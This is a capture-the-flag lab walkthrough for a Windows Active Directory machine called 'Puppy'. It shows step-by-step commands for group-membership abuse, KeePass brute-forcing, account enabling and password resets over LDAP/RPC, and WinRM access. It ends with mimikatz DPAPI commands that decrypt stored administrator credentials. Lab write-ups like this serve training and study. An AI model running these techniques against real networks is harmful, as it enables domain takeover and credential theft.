---
hidden: true
---

# Puppy

## Machine Info

Starting credentials: `levi.james / KingofAkron2025!`&#x20;



## Port Scanning

```bash
nmap -T5 -sV -p- --open -oN port_scan.txt 10.10.11.70

Nmap scan report for 10.10.11.70
Host is up (0.037s latency).
Not shown: 65513 filtered tcp ports (no-response)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Simple DNS Plus
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2025-05-21 17:38:19Z)
111/tcp   open  rpcbind       2-4 (RPC #100000)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: PUPPY.HTB0., Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
2049/tcp  open  nlockmgr      1-4 (RPC #100021)
3260/tcp  open  iscsi?
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: PUPPY.HTB0., Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
9389/tcp  open  mc-nmf        .NET Message Framing
49664/tcp open  msrpc         Microsoft Windows RPC
49667/tcp open  msrpc         Microsoft Windows RPC
49669/tcp open  msrpc         Microsoft Windows RPC
49670/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
49687/tcp open  msrpc         Microsoft Windows RPC
52983/tcp open  msrpc         Microsoft Windows RPC
53023/tcp open  msrpc         Microsoft Windows RPC
Service Info: Host: DC; OS: Windows; CPE: cpe:/o:microsoft:windows
```



## Windows Enumeration

### SMB Enumeration

Start with enumerate the SMB shares with the credentials that we have.

```bash
crackmapexec smb 10.10.11.70 -u 'levi.james' -p 'KingofAkron2025!' --shares
```

<figure><img src="../../../.gitbook/assets/image (246).png" alt=""><figcaption></figcaption></figure>

Nothing interesting so far. We are not allow to read/write the DEV share.



### Enum4Linux

Run enum4linux-ng to find all users and futher informations

```bash
enum4linux-ng -u 'levi.james' -p 'KingofAkron2025!' 10.10.11.70
```



### BloodHound

Run the bloodhound-python scan that it will create a zip to upload.

{% code title="bloodhound-python" overflow="wrap" %}
```bash
bloodhound-python -c all -ns 10.10.11.70 -dc dc.puppy.htb -d puppy.htb --zip -u 'levi.james' -p 'KingofAkron2025!'
```
{% endcode %}

## "GenericWrite" over a group

We can try to search a bloodhound path to obtain developer group privs to read the SMB share found before.

<figure><img src="../../../.gitbook/assets/image (248).png" alt=""><figcaption></figcaption></figure>

### Add user to other group with "GenericWrite" priv

Exploit this misconfiguration trying add the user `levis.james` to `developers` group.

{% code overflow="wrap" %}
```bash
net rpc group addmem "DEVELOPERS" levi.james -U puppy.htb/levi.james%'KingofAkron2025!' -S 10.10.11.70
```
{% endcode %}

Now check if the previuos command worked, viewing all the member of the group

{% code overflow="wrap" %}
```bash
net rpc group members "DEVELOPERS" -U puppy.htb/levi.james%'KingofAkron2025!' -S 10.10.11.70
```
{% endcode %}

<figure><img src="../../../.gitbook/assets/image (249).png" alt=""><figcaption></figcaption></figure>

### SMB shares with new group permission

Now that we are in the `Developers` group we can view the content of `DEV` share in SMB shares.

<figure><img src="../../../.gitbook/assets/image (250).png" alt=""><figcaption></figcaption></figure>

Enter in that share

```bash
smbclient -N //10.10.11.70/DEV -U 'levi.james%KingofAkron2025!'

smb: \> ls
  .                                  DR        0  Wed May 21 22:01:01 2025
  ..                                  D        0  Sat Mar  8 17:52:57 2025
  KeePassXC-2.7.9-Win64.msi           A 34394112  Sun Mar 23 08:09:12 2025
  Projects                            D        0  Sat Mar  8 17:53:36 2025
  recovery.kdbx                       A     2677  Wed Mar 12 03:25:46 2025

                5080575 blocks of size 4096. 1537423 blocks available
```

We can see that there is a .KDBX file, which is a KeePass database.

### Crack and Open a .kdbx file

Trying extract the hash from the file with KeePass2john, it give me this error

```bash
keepass2john recovery.kdbx                             
! recovery.kdbx : File version '40000' is currently not supported!
```

Becouse the tool doesn't supper the version 4.X of the KeePass file.

I found another script on GitHub that extract the hash and brute force it with a wordlist

{% embed url="https://github.com/r3nt0n/keepass4brute" %}

```bash
./keepass4brute.sh recovery.kdbx /usr/share/wordlists/rockyou.txt
```

<figure><img src="../../../.gitbook/assets/image (251).png" alt=""><figcaption></figcaption></figure>

The password is: `liverpool`&#x20;

Now we can open the database with `keepassxc-cli` in linux

```bash
keepassxc-cli open recovery.kdbx 
Enter password to unlock recovery.kdbx: liverpool
```

We have those user's passwords

<figure><img src="../../../.gitbook/assets/image (252).png" alt=""><figcaption></figcaption></figure>

| Full Name             | Username        | Password        |
| --------------------- | --------------- | --------------- |
| JAMIE WILLIAMSON      | jamie.williams  | JamieLove2025!  |
| ADAM SILVER           | adam.silver     | HJKL2025!       |
| **ANTONY C. EDWARDS** | **ant.edwards** | **Antman2025!** |
| STEVE TUCKER          |                 | Steve2025!      |
| SAMUEL BLAKE          |                 | ILY2025!        |

Checking the validity of passwords, only `ant.edwards`'s password already works.



Now i signed the obtained user inside bloodhound database, and i obtained a shot path to connect via PSRemote to Domain Controller with user.

<figure><img src="../../../.gitbook/assets/image (264).png" alt=""><figcaption></figcaption></figure>

### Enabling AD user

Adam Silver seems to be disabled on Active Directory

<figure><img src="../../../.gitbook/assets/image (261).png" alt=""><figcaption></figcaption></figure>

Enabling Adam's account using ldapsearch and ldapmodify

Create a ldif file

{% code title="mod.ldif" %}
```
dn: CN=ADAM D. SILVER,CN=USERS,DC=PUPPY,DC=HTB
changetype: modify
replace: userAccountControl
userAccountControl: 512
```
{% endcode %}

Execute this command:

{% code overflow="wrap" %}
```bash
ldapmodify -H ldap://10.10.11.70 -D "CN=ANTHONY J. EDWARDS,DC=PUPPY,DC=HTB" -w 'Antman2025!' -f mod.ldif

#output
modifying entry "CN=ADAM D. SILVER,CN=USERS,DC=PUPPY,DC=HTB"
```
{% endcode %}

Relunch the bloodhound scan we can see that the user Adam is enabled.

<figure><img src="../../../.gitbook/assets/image (263).png" alt=""><figcaption></figcaption></figure>





### Reset Adam's password with "GenericAll" priv

We can notice that the user `and.edwars` is inside a `Senior Devs`, that they have "GenericAll" privilege on `adam.silver` user.

So we can try to reset adam's password.

{% code title="Connect to rpcclient" %}
```bash
rpcclient -U PUPPY.HTB/ant.edwards 10.10.11.70
Password for [PUPPY.HTB\ant.edwards]: Antman2025!
```
{% endcode %}

{% code title="Change adam's pass" %}
```bash
setuserinfo2 adam.silver 23 'Password123!'
```
{% endcode %}

### Win-RM connection as Adam Silver

Now that we reseted the adam's password, make access to DC using `evil-winrm`

```bash
evil-winrm -i 10.10.11.70 -u 'adam.silver' -p 'Password123!'
```

### User.flag

```powershell
more C:\Users\adam.silver\Desktop\user.txt
```



## Privilege Escalation for Root

We can find a juicy directory on `C:\Backups` disk with inside this:

```powershell
cd C:\Backups
dir

# output
Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
-a----          3/8/2025   8:22 AM        4639546 site-backup-2024-12-30.zip
```

Download this file with Download function in evil-winrm and analyze it.

Extract zip content:

```bash
unzip site-backup-2024-12-30.zip
```

We have a configuration file with `steph.cooper`'s credentials.

```bash
nano nms-auth-config.xml.bak

# output 
<?xml version="1.0" encoding="UTF-8"?>
<ldap-config>
    <server>
        <host>DC.PUPPY.HTB</host>
        <port>389</port>
        <base-dn>dc=PUPPY,dc=HTB</base-dn>
        <bind-dn>cn=steph.cooper,dc=puppy,dc=htb</bind-dn>
        <bind-password>ChefSteph2025!</bind-password>
    </server>
 ...
```

We can access as a `steph.cooper` to the DC.

```bash
evil-winrm -i 10.10.11.70 -u 'steph.cooper' -p 'ChefSteph2025!'
```



### DPAPI decrypt creds

Running `WinPEASx64.exe` we can notice that this user has a DPAPI masterkey to decrypt some files.

<pre data-title="winPEAS output" data-overflow="wrap"><code><strong>...
</strong><strong>C:\Users\steph.cooper\AppData\Roaming\Microsoft\Credentials\C8D69EBE9A43E9DEBF6B5FBD48B521B9
</strong>
Description: Enterprise Credential Data

MasterKey: 556a2412-1275-4ccf-b721-e6a0b4f90407
...
</code></pre>

Get `encrypted masterkey`

{% code overflow="wrap" %}
```powershell
dir C:\Users\steph.cooper\AppData\Roaming\Microsoft\Protect\S-1-5-21-1487982659-1829050783-2281216199-1107\

556a2412-1275-4ccf-b721-e6a0b4f90407
```
{% endcode %}

Extract masterkey using steph.cooper's `SID` and `password`.

{% code title="mimikatz.exe dpapi::masterkey" overflow="wrap" %}
```powershell
.\mimikatz.exe 'dpapi::masterkey /in:"C:\Users\steph.cooper\AppData\Roaming\Microsoft\Protect\S-1-5-21-1487982659-1829050783-2281216199-1107\556a2412-1275-4ccf-b721-e6a0b4f90407" /sid:S-1-5-21-1487982659-1829050783-2281216199-1107 /password:ChefSteph2025!  /protected' exit
```
{% endcode %}

```
...
[masterkey] with password: ChefSteph2025! (protected user)
  key : d9a570722fbaf7149f9f9d691b0e137b7413c1414c452f9c77d6d8a8ed9efe3ecae990e047debe4ab8cc879e8ba99b31cdb7abad28408d8d9cbfdcaf319e9c84
  sha1: 3c3cf2061dd9d45000e9e6b49e37c7016e98e701
```



**Extract credentials** from protected file using decrypted masterkey.

{% code overflow="wrap" %}
```powershell
.\mimikatz.exe 'dpapi::cred /in:"C:\Users\steph.cooper\AppData\Roaming\Microsoft\Credentials\C8D69EBE9A43E9DEBF6B5FBD48B521B9" /masterkey:d9a570722fbaf7149f9f9d691b0e137b7413c1414c452f9c77d6d8a8ed9efe3ecae990e047debe4ab8cc879e8ba99b31cdb7abad28408d8d9cbfdcaf319e9c84' exit
```
{% endcode %}

```
  UserName       : steph.cooper_adm
  CredentialBlob : FivethChipOnItsWay2025!
  Attributes     : 0

```

{% embed url="https://www.thehacker.recipes/ad/movement/credentials/dumping/dpapi-protected-secrets" %}

We can view in the BloodHound that the user is inside the `Administrators` group.

<figure><img src="../../../.gitbook/assets/image (28) (1).png" alt=""><figcaption></figcaption></figure>

Access as a `steph.cooper_adm` into DC using `evil-winrm`.

```bash
evil-winrm -i 10.10.11.70 -u 'steph.cooper_adm' -p 'FivethChipOnItsWay2025!'
```

### Root.flag

With the `Administrators` privilege we can read the `root.txt` in the `Administrator` directory.

```
more C:\Users\Administrator\Desktop\root.txt
```

